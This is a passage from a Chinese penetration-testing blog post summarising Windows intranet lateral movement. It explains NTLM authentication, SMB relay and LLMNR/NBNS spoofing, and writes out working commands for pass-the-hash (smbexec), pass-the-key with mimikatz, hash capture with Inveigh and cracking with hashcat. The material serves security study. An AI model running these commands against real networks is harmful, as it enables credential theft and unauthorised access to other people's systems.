+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes xx:xxx ./Administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826114404627.png" alt="image-20200826114404627"></p>
+<p>​        在windows server 2012R2以上默认无法使用RID非500的用户进行PTH利用。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826140439030.png" alt="image-20200826140439030"></p>
+<p>​        当我们设置LocalAccountTokenFilterPolicy（默认不存在）这项为1时，则其他用户也可PTH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142001554.png" alt="image-20200826142001554"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142030450.png" alt="image-20200826142030450"></p>
+<p><strong>pass the key</strong></p>
+<p>​        当目标处于域环境并且安装了KB2871997补丁，可以使用这种方法进行横向移动。首先导出aes key </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826143252802.png" alt="image-20200826143252802"></p>
+<p>​        使用mimikatz进行PTK</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /user:Administrator /domain:xxx.ORG /aes256:xxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144548650.png" alt="image-20200826144548650"></p>
+<p>​        在dir的时候注意要使用主机名而不是ip。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144657435.png" alt="image-20200826144657435"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144600749.png" alt="image-20200826144600749"></p>
+<h3 id="SMB-RELAY"><a href="#SMB-RELAY" class="headerlink" title="SMB RELAY"></a>SMB RELAY</h3><p><strong>什么是SMB?</strong></p>
+<p>​        服务器消息块（SMB）协议是一种网络文件共享协议，在Microsoft Windows中实现称为Microsoft SMB协议。SMB允许您共享文件，磁盘，目录，打印机等。SMB运行在445端口并且提供了多种功能，例如操作文件，共享，消息传递，IPC等。</p>
+<p><strong>什么是net-hash?</strong></p>
+<p>​        net-hash是windows hash在网络中传递的一种形式形式，net-hash是由ntml hash计算得来的。</p>
+<p><strong>什么是smb relay?</strong></p>
+<p>​        要理解smb relay(中继)，关于windows认证过程的了解是绕不过去了，所以有必要先了解windows NTML是怎么认证的。</p>
+<p>第一步：Client 将用户名和本机的一些信息发送给 Server</p>
+<p>第二步：Server 产生一个16位的 Challenge 发送给 Client，同时本地存储 Challenge</p>
+<p>第三步：Client 接收到 Server 的 Challenge 后使用输入的明文密码产生的 NTLM Hash加密 Challenge 产生 Response（也称为Net-NTLM Hash），并将 Response 发送给 Server</p>
+<p>第四步：服务端接收到 Response ，使用 SAM 中所存储的对应用户的 NTLM Hash 来加密步骤2所存储的 Challenge ，并将结果与 Response 进行比较。若一致则通过认证。</p>
+<p>​        通过上面的过程我们可以看到，在第三步客户端是使用服务端生成的Challenge和本地的NTLM Hash一起加密产生了net-hash，并将net-hash传递给服务端。如果在NTLM 认证的过程中，有一个第三者作为一个中介，client会以为它是server端并且将net-hash发送给这个第三者，那么这个第三者就可以拿到client的net-hash，替代client与server端进行认证，这个过程无论对于client还是server都是正常的完成ntml认证。但是对于第三者而言，它可以代替client去访问server端的资源。这个过程就叫做smb relay。</p>
+<p><strong>怎么发起smb relay？</strong></p>
+<p>​        一般情况下，我们要攻击的主机即使进行ntml认证，流量并不会经过第三者的主机。那么如何让目标主机和我们主机进行ntml认证呢。</p>
+<p>1、LLMNR/NBNS欺骗</p>
+<p>​            LLMNR和NBNS是Windows系统完成名称解析的一种方法。windows的名称解析规则如下：</p>
+<ul>
+<li>首先在本地host文件中进行查询(%windir%\System32\drivers\etc\hosts)</li>
+<li>其次在DNS缓存/DNS服务器中进行查询</li>
+<li>当上面两种方式未查询到后，则使用LLMNR或者NBNS协议进行解析。</li>
+</ul>
+<p>LLMNR工作过程：主机会通过 UDP 向局域网内发送多播查询，查询主机名对应的IP，查询范围被限制在本地子网内。本地子网内每台支持LLMNR的主机在收到这个查询请求后，收到该请求的主机会判断自己的主机名是不是这个查询的主机名。如果是，这台主机会回复自己IP地址给请求该查询的主机；如果不是<strong>，</strong>则丢弃该请求。</p>
+<p>​        因为LLMNR并没有认证相应的主机是否是需要寻找的主机，因此攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。</p>
+<p><strong>windows下使用Inveigh针对SMB RELAY利用</strong></p>
+<p>​        首先windows不通版本使用的smb版本是不一样的，具体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Smb v1 主要用于 xp/2003 以下的系统中</span><br><span class="line">Smb v2.x 主要用于 win vista/7/2008/2008r2</span><br><span class="line">Smb v3.x 主要用于 win 8 / 8.1 / 2012 / 2012r2 /2016</span><br></pre></td></tr></table></figure>
+
+<p>​        当目标开启了启 smb 签名后则无法利用，一般windows server会开启而windows单机不开启，打了ms08-068[KB957097]的主机也无法利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Users\dbadmin\Desktop\Inveigh.ps1</span><br><span class="line">Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y –LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826161637020.png" alt="image-20200826161637020"></p>
+<p>​        当我们在windows单机上对不存在的主机发起smb请求，即可获取net-hash</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163902324.png" alt="image-20200826163902324"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163718354.png" alt="image-20200826163718354"></p>
+<p>​        抓到net-hash后，可以尝试使用hashcat跑一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 -m 5600 hash.txt top10w.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826165658506.png" alt="image-20200826165658506"></p>
+<p><strong>参考文章</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/246440.html">内网横向移动：利用WMI来渗透</a></p>
+<p><a target="_blank" rel="noopener" href="https://lengjibo.github.io/LateralMovement/">LateralMovement(横向移动)</a></p>
+<p><a href="%5Bhttps://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/%5D(https://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/)">域内横向移动二</a></p>
+<p><a href="%5Bhttps://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/%5D(https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/)">内网横移之WinRM</a></p>
+<p><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">横向运动– WinRM</a></p>
+<p><a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/345687ddad59">SCShell：横向移动工具</a></p>
+<p><a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-SMB">横向渗透之 [SMB]</a></p>
+<p><a href="%5Bhttps://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%5D(https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)">域渗透——利用DCOM在远程系统执行程序</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c7d8e7d9c03c">横向移动之smb中继攻击</a></p>
+<p><a href="%5Bhttps://www.7ten7.top/2019/12/12/2019-12-12-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B9%8BNTLM/%5D(https://www.7ten7.top/2019/12/12/2019-12-12-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B9%8BNTLM/)">Windows认证机制之NTLM</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/107698144">内网渗透研究：LLMNR和NetBIOS欺骗攻击分析</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/内网渗透/">内网渗透</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
